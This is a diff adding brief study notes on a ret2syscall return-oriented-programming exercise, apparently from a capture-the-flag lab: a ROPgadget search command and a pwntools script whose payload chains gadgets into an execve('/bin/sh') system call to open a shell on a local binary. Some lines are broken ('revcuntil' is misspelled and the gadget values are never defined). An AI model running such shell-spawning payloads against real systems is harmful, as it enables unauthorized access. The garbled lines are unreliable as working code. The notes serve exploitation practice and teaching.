@@ -1,0 +1,16 @@
+ROPgadget:
+ROPgadget --binary ret2syscall --only 'pop|ret' | grep "eax"
+
+pwntools:
+from pwn import *
+sh = process('./ret2syscall')
+payload = flat(
+    ['A' * 112, pop_eax_ret, 0xb, pop_ecx_ebx_ret, 0,binsh, pop_edx_ret,0, int_0x80])
+sh.sendline(payload)
+sh.interactive()
+sh.recvline()
+sh.revcuntil('[')--->daadsds[
+sh.revcuntil(']',drop=True)--->0x11223344
+
+    
+  
